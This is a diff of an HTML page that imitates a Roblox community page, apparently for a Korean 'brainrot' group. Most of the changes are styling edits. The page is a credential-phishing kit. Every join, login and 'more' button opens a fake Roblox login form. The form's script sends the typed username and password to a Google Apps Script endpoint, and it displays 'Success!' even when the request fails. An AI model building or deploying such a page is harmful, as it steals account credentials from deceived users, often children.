@@ -10,25 +10,21 @@
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: 'HCo Gotham SSm', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
             background-color: #f2f4f5;
         }
-
         /* Content Fade In */
         .header, .container, .footer {
             opacity: 0;
             animation: contentFadeIn 0s ease forwards;
             animation-delay: 0.5s;
         }
-
         @keyframes contentFadeIn {
             to {
                 opacity: 1;
             }
         }
-
         /* Header */
         .header {
             background-color: white;
@@ -41,7 +37,6 @@
             top: 0;
             z-index: 100;
         }
-
         .logo {
             width: 28px;
             height: 28px;
@@ -55,7 +50,6 @@
             flex-shrink: 0;
             animation: logoFadeIn 0.6s ease-out;
         }
-
         .logo::before {
             content: '';
             width: 8.5px;
@@ -64,7 +58,6 @@
             position: absolute;
             animation: logoInnerFadeIn 0.6s ease-out;
         }
-
         @keyframes logoFadeIn {
             0% {
                 background-color: #d0d0d0;
@@ -75,7 +68,6 @@
                 opacity: 1;
             }
         }
-
         @keyframes logoInnerFadeIn {
             0% {
                 background-color: #e8e8e8;
@@ -86,20 +78,17 @@
                 opacity: 1;
             }
         }
-
         .nav {
             display: flex;
             gap: 28px;
             flex: 1;
         }
-
         .nav a {
             text-decoration: none;
             color: #393b3d;
             font-weight: 600;
             font-size: 16px;
         }
-
         .search-box {
             display: flex;
             align-items: center;
@@ -110,7 +99,6 @@
             flex: 1;
             max-width: 300px;
         }
-
         .search-box input {
             border: none;
             background: none;
@@ -118,13 +106,11 @@
             font-size: 14px;
             width: 100%;
         }
-
         .header-buttons {
             display: flex;
             gap: 12px;
             margin-left: auto;
         }
-
         .btn {
             padding: 6px 20px;
             border-radius: 8px;
@@ -134,37 +120,33 @@
             font-size: 16px;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
         }
-
         .btn-primary {
             background-color: #0066ff;
             color: white;
         }
-
         .btn-secondary {
             background-color: white;
             color: #5a5d61;
             border: 1px solid #5a5d61;
         }
-
         /* Main Content */
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 32px 24px;
+            padding: 16px 24px;
         }
-
         .page-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 32px;
+            margin-bottom: 24px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid #e5e8eb;
         }
-
         .page-header h1 {
             font-size: 32px;
             font-weight: 700;
         }
-
         .more-link {
             color: #0066ff;
             text-decoration: none;
@@ -173,22 +155,19 @@
             align-items: center;
             gap: 4px;
         }
-
         /* Community Card */
         .community-card {
             background: white;
-            border-radius: 12px;
+            border-radius: 4px;
             padding: 32px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
-
         .community-header {
             display: flex;
             align-items: flex-start;
             gap: 24px;
             margin-bottom: 24px;
         }
-
         .community-icon {
             width: 120px;
             height: 120px;
@@ -202,18 +181,21 @@
             justify-content: center;
             animation: sweepGradient 2.5s linear infinite, iconReveal 0s ease-out forwards;
             animation-delay: 0s, 3.5s;
+            -webkit-animation: sweepGradient 2.5s linear infinite, iconReveal 0s ease-out forwards;
+            -webkit-animation-delay: 0s, 3.5s;
         }
-
         .community-icon::before {
             content: '🦈';
             position: absolute;
             font-size: 65px;
             filter: saturate(150%) brightness(110%);
+            -webkit-filter: saturate(150%) brightness(110%);
             opacity: 0;
             animation: iconContentReveal 0s ease-out forwards;
             animation-delay: 3.5s;
+            -webkit-animation: iconContentReveal 0s ease-out forwards;
+            -webkit-animation-delay: 3.5s;
         }
-
         @keyframes sweepGradient {
             0% {
                 background-position: 200% 50%;
@@ -222,35 +204,48 @@
                 background-position: -100% 50%;
             }
         }
-
+        @-webkit-keyframes sweepGradient {
+            0% {
+                background-position: 200% 50%;
+            }
+            100% {
+                background-position: -100% 50%;
+            }
+        }
         @keyframes iconReveal {
             to {
                 background: linear-gradient(135deg, #ff6b9d 0%, #c44569 100%);
                 animation: none;
             }
         }
-
+        @-webkit-keyframes iconReveal {
+            to {
+                background: linear-gradient(135deg, #ff6b9d 0%, #c44569 100%);
+                -webkit-animation: none;
+            }
+        }
         @keyframes iconContentReveal {
             to {
                 opacity: 1;
             }
         }
-
+        @-webkit-keyframes iconContentReveal {
+            to {
+                opacity: 1;
+            }
+        }
         .community-info {
             flex: 1;
         }
-
         .community-info h2 {
             font-size: 28px;
             margin-bottom: 4px;
         }
-
         .community-info .author {
             color: #606468;
             font-size: 14px;
             margin-bottom: 24px;
         }
-
         .join-btn {
             background-color: #0066ff;
             color: white;
@@ -262,7 +257,6 @@
             cursor: pointer;
             margin-left: auto;
         }
-
         .menu-btn {
             background: none;
             border: none;
@@ -271,24 +265,20 @@
             color: #606468;
             padding: 8px;
         }
-
         .members-count {
             color: #606468;
             font-size: 14px;
             margin-bottom: 16px;
         }
-
         .description {
             color: #393b3d;
             margin-bottom: 8px;
         }
-
         .more-text {
             color: #0066ff;
             font-weight: 600;
             cursor: pointer;
         }
-
         /* Tabs */
         .tabs {
             display: flex;
@@ -296,7 +286,6 @@
             border-bottom: 1px solid #e5e8eb;
             margin: 32px 0;
         }
-
         .tab {
             padding: 12px 0;
             color: #606468;
@@ -304,65 +293,34 @@
             font-weight: 600;
             border-bottom: 3px solid transparent;
         }
-
         .tab.active {
             color: #393b3d;
             border-bottom-color: #393b3d;
         }
-
         /* Tab Content Sections */
         .tab-content {
             display: none;
         }
-
         .tab-content.active {
             display: block;
         }
-
         /* Store Section */
-        .store-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 32px;
-        }
-
-        .store-header h2 {
-            font-size: 32px;
-            font-weight: 700;
-            color: #393b3d;
-        }
-
-        .see-all {
-            color: #606468;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
         .store-empty {
             text-align: center;
             padding: 80px 20px;
         }
-
         .store-empty p {
             font-size: 18px;
             color: #606468;
         }
-
         /* Shout Section */
         .shout-section {
             margin-bottom: 32px;
         }
-
         .shout-section h3 {
             font-size: 20px;
             margin-bottom: 16px;
         }
-
         .shout-post {
             background-color: #f8f9fa;
             padding: 16px;
@@ -370,7 +328,6 @@
             display: flex;
             gap: 12px;
         }
-
         .shout-avatar {
             width: 48px;
             height: 48px;
@@ -378,27 +335,23 @@
             background: linear-gradient(90deg, #f0f0f0 0%, #f0f0f0 35%, #d0d0d0 50%, #f0f0f0 65%, #f0f0f0 100%);
             background-size: 300% 100%;
             animation: sweepGradient 2.5s linear infinite;
+            -webkit-animation: sweepGradient 2.5s linear infinite;
         }
-
         .shout-content {
             flex: 1;
         }
-
         .shout-author {
             font-weight: 600;
             margin-bottom: 4px;
         }
-
         .shout-text {
             color: #393b3d;
             margin-bottom: 8px;
         }
-
         .shout-date {
             color: #606468;
             font-size: 13px;
         }
-
         /* Members Section */
         .members-section h3 {
             font-size: 20px;
@@ -407,7 +360,6 @@
             justify-content: space-between;
             align-items: center;
         }
-
         .members-controls {
             display: flex;
             align-items: center;
@@ -415,7 +367,6 @@
             font-size: 14px;
             color: #606468;
         }
-
         .members-controls button {
             background: none;
             border: none;
@@ -423,7 +374,6 @@
             font-size: 18px;
             color: #606468;
         }
-
         .player-filter {
             padding: 8px 16px;
             border: 1px solid #d1d5d8;
@@ -431,18 +381,15 @@
             background: white;
             font-size: 14px;
         }
-
         .members-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
             gap: 24px;
             margin-top: 24px;
         }
-
         .member-card {
             text-align: center;
         }
-
         .member-avatar {
             width: 100px;
             height: 100px;
@@ -451,13 +398,12 @@
             background-size: 300% 100%;
             margin-bottom: 8px;
             animation: sweepGradient 2.5s linear infinite;
+            -webkit-animation: sweepGradient 2.5s linear infinite;
         }
-
         .member-name {
             font-size: 13px;
             color: #393b3d;
         }
-
         /* Footer */
         .footer {
             background-color: white;
@@ -465,7 +411,6 @@
             padding: 32px 24px;
             margin-top: 48px;
         }
-
         .footer-links {
             display: flex;
             gap: 32px;
@@ -473,13 +418,11 @@
             margin-bottom: 24px;
             flex-wrap: wrap;
         }
-
         .footer-links a {
             color: #606468;
             text-decoration: none;
             font-size: 14px;
         }
-
         .footer-text {
             text-align: center;
             color: #606468;
@@ -487,7 +430,6 @@
             max-width: 900px;
             margin: 0 auto;
         }
-
         /* Loading Overlay */
         .loading-overlay {
             display: none;
@@ -501,11 +443,9 @@
             align-items: center;
             justify-content: center;
         }
-
         .loading-overlay.active {
             display: flex;
         }
-
         .loading-spinner {
             width: 50px;
             height: 50px;
@@ -514,13 +454,11 @@
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
-
         @keyframes spin {
             to {
                 transform: rotate(360deg);
             }
         }
-
         /* Login Modal */
         .modal {
             display: none;
@@ -536,12 +474,10 @@
             opacity: 0;
             transition: opacity 0.3s ease;
         }
-
         .modal.active {
             display: flex;
             opacity: 1;
         }
-
         .modal-content {
             background-color: #2d3338;
             border-radius: 12px;
@@ -552,54 +488,44 @@
             transform: scale(0.9);
             transition: transform 0.3s ease;
         }
-
         .modal.active .modal-content {
             transform: scale(1);
         }
-
         .modal-title {
             opacity: 0;
             animation: fadeInUp 0s ease forwards;
             animation-delay: 0.35s;
         }
-
         .login-form {
             opacity: 0;
             animation: fadeInUp 0s ease forwards;
             animation-delay: 0.05s;
         }
-
         .forgot-link {
             opacity: 0;
             animation: fadeInUp 0s ease forwards;
             animation-delay: 0.24s;
         }
-
         .divider {
             opacity: 0;
             animation: fadeInUp 0s ease forwards;
             animation-delay: 0.10s;
         }
-
         .secondary-button {
             opacity: 0;
             animation: fadeInUp 0s ease forwards;
         }
-
         .secondary-button:first-of-type {
             animation-delay: 0.27s;
         }
-
         .secondary-button:last-of-type {
             animation-delay: 0.08s;
         }
-
         .signup-text {
             opacity: 0;
             animation: fadeInUp 0s ease forwards;
             animation-delay: 0.18s;
         }
-
         @keyframes fadeInUp {
             from {
                 opacity: 0;
@@ -608,7 +534,6 @@
                 opacity: 1;
             }
         }
-
         .modal-close {
             position: absolute;
             top: 16px;
@@ -620,7 +545,6 @@
             cursor: pointer;
             padding: 8px;
         }
-
         .modal-title {
             color: white;
             font-size: 32px;
@@ -628,13 +552,11 @@
             text-align: center;
             margin-bottom: 32px;
         }
-
         .login-form {
             display: flex;
             flex-direction: column;
             gap: 16px;
         }
-
         .login-input {
             background-color: #3d4349;
             border: 1px solid #4d5359;
@@ -644,15 +566,12 @@
             font-size: 16px;
             outline: none;
         }
-
         .login-input::placeholder {
             color: #909499;
         }
-
         .login-input:focus {
             border-color: #0066ff;
         }
-
         .login-button {
             background-color: transparent;
             border: 2px solid white;
@@ -664,16 +583,13 @@
             cursor: pointer;
             margin-top: 8px;
         }
-
         .login-button:hover {
             background-color: rgba(255, 255, 255, 0.1);
         }
-
         .login-button:disabled {
             opacity: 0.6;
             cursor: not-allowed;
         }
-
         .forgot-link {
             color: white;
             text-align: center;
@@ -681,13 +597,11 @@
             margin: 16px 0;
             display: block;
         }
-
         .divider {
             height: 1px;
             background-color: #4d5359;
             margin: 24px 0;
         }
-
         .secondary-button {
             background-color: #4d5359;
             border: none;
@@ -699,39 +613,32 @@
             cursor: pointer;
             margin-bottom: 12px;
         }
-
         .secondary-button:hover {
             background-color: #5d6369;
         }
-
         .signup-text {
             color: white;
             text-align: center;
             margin-top: 24px;
         }
-
         .signup-text a {
             color: #0066ff;
             text-decoration: none;
             font-weight: 600;
         }
-
         /* Mobile Responsive */
         @media (max-width: 768px) {
             .header {
                 padding: 8px 12px;
                 gap: 12px;
             }
-
             .logo {
                 width: 32px;
                 height: 32px;
             }
-
             .nav {
                 display: none;
             }
-
             .search-box {
                 order: 4;
                 flex: 0 0 auto;
@@ -742,80 +649,64 @@
                 background-color: transparent;
                 max-width: none;
             }
-
             .search-box input {
                 display: none;
             }
-
             .search-box svg {
                 width: 24px;
                 height: 24px;
             }
-
             .header-buttons {
                 margin-left: auto;
                 gap: 8px;
             }
-
             .btn {
                 padding: 8px 16px;
             }
-
             .page-header h1 {
                 font-size: 24px;
             }
-
             .community-card {
                 padding: 20px;
             }
-
             .community-header {
                 flex-direction: column;
                 align-items: center;
                 text-align: center;
                 gap: 16px;
             }
-
             .community-icon {
                 width: 100px;
                 height: 100px;
             }
-
             .community-info {
                 width: 100%;
             }
-
             .community-info h2 {
                 font-size: 24px;
             }
-
             .join-btn {
                 width: 100%;
                 margin-left: 0;
                 order: 5;
             }
-
             .menu-btn {
                 position: absolute;
                 top: 20px;
                 right: 20px;
             }
-
             .tabs {
                 gap: 24px;
             }
-
             .members-section h3 {
                 flex-direction: column;
                 align-items: flex-start;
                 gap: 12px;
             }
-
             .members-grid {
                 grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
                 gap: 16px;
             }
-
             .member-avatar {
                 width: 80px;
                 height: 80px;
@@ -828,7 +719,6 @@
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
     </div>
-
     <!-- Login Modal -->
     <div class="modal" id="loginModal">
         <div class="modal-content">
@@ -846,7 +736,6 @@
             <p class="signup-text">Don't have an account? <a href="#">Sign Up</a></p>
         </div>
     </div>
-
     <!-- Header -->
     <header class="header">
         <div class="logo"></div>
@@ -868,15 +757,13 @@
             <button class="btn btn-secondary" onclick="openModalWithLoading()">Log In</button>
         </div>
     </header>
-
     <!-- Main Content -->
     <div class="container">
-        <div class="page-header">
-            <h1>Communities</h1>
-            <a href="#" class="more-link" onclick="openModalWithLoading(); return false;">More Communities →</a>
-        </div>
-
         <div class="community-card">
+            <div class="page-header">
+                <h1>Communities</h1>
+                <a href="#" class="more-link" onclick="openModalWithLoading(); return false;">More Communities →</a>
+            </div>
             <div class="community-header">
                 <div class="community-icon"></div>
                 <div class="community-info">
@@ -886,18 +773,15 @@
                 <button class="join-btn" onclick="openModalWithLoading()">Join Community</button>
                 <button class="menu-btn">⋯</button>
             </div>
-
             <p class="members-count"><strong>57 Members</strong></p>
             <p class="description">안녕하세요 브레인롯 종합 커뮤입니다</p>
             <span class="more-text" onclick="openModalWithLoading()">more</span>
-
             <!-- Tabs -->
             <div class="tabs">
                 <a href="#" class="tab active" id="tab-about">About</a>
                 <a href="#" class="tab" id="tab-store">Store</a>
                 <a href="#" class="tab" id="tab-affiliates">Affiliates</a>
             </div>
-
             <!-- About Section (default visible) -->
             <div id="about-section" class="tab-content active">
                 <!-- Shout Section -->
@@ -912,7 +796,6 @@
                         </div>
                     </div>
                 </div>
-
                 <!-- Members Section -->
                 <div class="members-section">
                     <h3>
@@ -926,7 +809,6 @@
                             </select>
                         </div>
                     </h3>
-
                     <div class="members-grid">
                         <div class="member-card">
                             <div class="member-avatar"></div>
@@ -967,7 +849,6 @@
                     </div>
                 </div>
             </div>
-
             <!-- Store Section -->
             <div id="store-section" class="tab-content">
                 <div class="shout-section">
@@ -977,7 +858,6 @@
                     </div>
                 </div>
             </div>
-
             <!-- Affiliates Section -->
             <div id="affiliates-section" class="tab-content">
                 <div class="shout-section">
@@ -987,7 +867,6 @@
             </div>
         </div>
     </div>
-
     <!-- Footer -->
     <footer class="footer">
         <div class="footer-links">
@@ -1005,76 +884,49 @@
             ©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
         </p>
     </footer>
-
     <script>
         function openModalWithLoading() {
-            // 로딩 오버레이 표시
             const loadingOverlay = document.getElementById('loadingOverlay');
             loadingOverlay.classList.add('active');
-            
-            // 0.6초 후 로딩 숨기고 모달 표시
             setTimeout(function() {
                 loadingOverlay.classList.remove('active');
                 document.getElementById('loginModal').classList.add('active');
             }, 600);
         }
-
         function closeModal() {
             document.getElementById('loginModal').classList.remove('active');
         }
-
-        // Close modal when clicking outside
         document.getElementById('loginModal').addEventListener('click', function(e) {
             if (e.target === this) {
                 closeModal();
             }
         });
-
-        // Tab switching
         document.getElementById('tab-about').addEventListener('click', function(e) {
             e.preventDefault();
             switchTab('about');
         });
-
         document.getElementById('tab-store').addEventListener('click', function(e) {
             e.preventDefault();
             switchTab('store');
         });
-
         document.getElementById('tab-affiliates').addEventListener('click', function(e) {
             e.preventDefault();
             switchTab('affiliates');
         });
-
         function switchTab(tabName) {
-            // Remove active from all tabs
             document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
-            
-            // Hide all content sections
             document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-            
-            // Activate selected tab and content
             document.getElementById('tab-' + tabName).classList.add('active');
             document.getElementById(tabName + '-section').classList.add('active');
         }
-
-        // ===== 구글 시트 연동 설정 =====
-        // 아래 URL을 여러분의 Google Apps Script 웹 앱 URL로 교체하세요
         const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE';
-
-        // 로그인 폼 제출 처리
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const loginButton = document.getElementById('loginButton');
-            
-            // 버튼 비활성화 및 로딩 표시
             loginButton.disabled = true;
             loginButton.textContent = 'Logging in...';
-            
-            // 구글 시트로 데이터 전송
             fetch(GOOGLE_SCRIPT_URL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -1087,7 +939,6 @@
                 })
             })
             .then(() => {
-                // 성공 (no-cors 모드에서는 실제 응답을 확인할 수 없음)
                 loginButton.textContent = 'Success!';
                 setTimeout(() => {
                     closeModal();
@@ -1098,7 +949,6 @@
             })
             .catch(error => {
                 console.error('Error:', error);
-                // no-cors 모드에서는 여기도 성공으로 처리
                 loginButton.textContent = 'Success!';
                 setTimeout(() => {
                     closeModal();
